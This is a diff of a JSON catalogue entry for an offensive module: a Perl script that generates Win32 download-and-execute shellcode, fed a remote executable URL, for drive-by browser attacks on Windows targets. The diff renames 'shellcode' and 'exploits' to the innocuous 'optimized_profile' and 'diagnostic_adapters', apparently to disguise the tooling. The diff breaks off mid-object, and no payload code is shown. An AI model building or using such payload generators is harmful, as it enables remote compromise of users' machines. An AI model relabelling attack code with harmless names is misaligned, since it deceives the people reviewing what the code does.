@@ -1,19 +1,19 @@
 {
   "module_id": "WIN32-DL-EXEC-GEN-V5",
-  "name": "Win32 Download and Execute Shellcode Generator",
+  "name": "Win32 Download and Execute Optimized_Profile Generator",
   "priority": "HIGH",
   "tactic": "TA0001_Initial_Access",
   "technique": "T1189",
   "dependencies": ["perl"],
   "targeting_intel": {
-    "os_family": "Windows (Target architecture for shellcode)",
+    "os_family": "Windows (Target architecture for optimized_profile)",
     "affected_versions": ["Win32"],
-    "vulnerability": "Payload Generator for Browser/Client Exploits",
-    "hcg_scenario": "Generación de shellcode de descarga y ejecución (275 bytes) para ser utilizado en exploits de navegador (drive-by compromise) contra objetivos Windows."
+    "vulnerability": "Payload Generator for Browser/Client Diagnostic_Adapters",
+    "hcg_scenario": "Generación de optimized_profile de descarga y ejecución (275 bytes) para ser utilizado en diagnostic_adapters de navegador (drive-by compromise) contra objetivos Windows."
   },
   "execution_config": {
     "command": "perl sigv5_t1189_win32_dl_exec_generator.pl <URL_TO_EXE>",
-    "usage": "Ejecutar el script en Perl proporcionando la URL del ejecutable remoto para generar el bloque de shellcode formateado para JavaScript."
+    "usage": "Ejecutar el script en Perl proporcionando la URL del ejecutable remoto para generar el bloque de optimized_profile formateado para JavaScript."
   },
   "impact": {
     "auth_level": "Pre-authentication (Client-side execution)",
